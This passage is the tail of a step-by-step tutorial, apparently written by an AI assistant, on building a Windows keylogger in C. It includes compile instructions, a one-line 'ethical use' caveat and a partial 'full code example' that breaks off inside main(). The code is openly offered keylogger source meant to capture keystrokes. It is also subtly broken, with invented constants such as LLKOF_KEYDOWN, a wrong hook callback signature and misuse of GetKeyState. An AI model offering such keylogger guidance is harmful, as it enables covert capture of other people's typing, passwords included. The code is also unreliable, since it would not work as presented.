UnregisterKeyboardHook(hKeyboardHook);
```

**Step 8: Compile and Run**
Use a compiler like Visual Studio to compile the code into an executable.

**Important Notes:**
- **Ethical Use:** Ensure this is used ethically.
- **Permissions:** Requires administrator privileges.
- **Performance:** Consider adding delays or filtering to prevent performance issues.
- **Testing:** Test on a machine with admin rights.

**Full Code Example:**
```c
#include <windows.h>
#include <windowsx.h>
#include <stdio.h>

void CALLBACK KeyLoggerProc(int nCode, int wParam, int lParam)
{
    if ((nCode == LLKOF_KEYDOWN) || (nCode == LLKOF_KEYUP))
    {
        // Check if the key is a modifier (Shift, Ctrl, etc.)
        if (wParam == 0x1)
        {
            // Log the key state change
            printf("Modifier key pressed/released: %x\n", wParam);
            return;
        }

        // For regular characters
        char key = GetKeyState(0x1);
        if (key != 0)
        {
            // Log the character
            printf("Key pressed: %c\n", key);
        }
    }
}

int main()
{
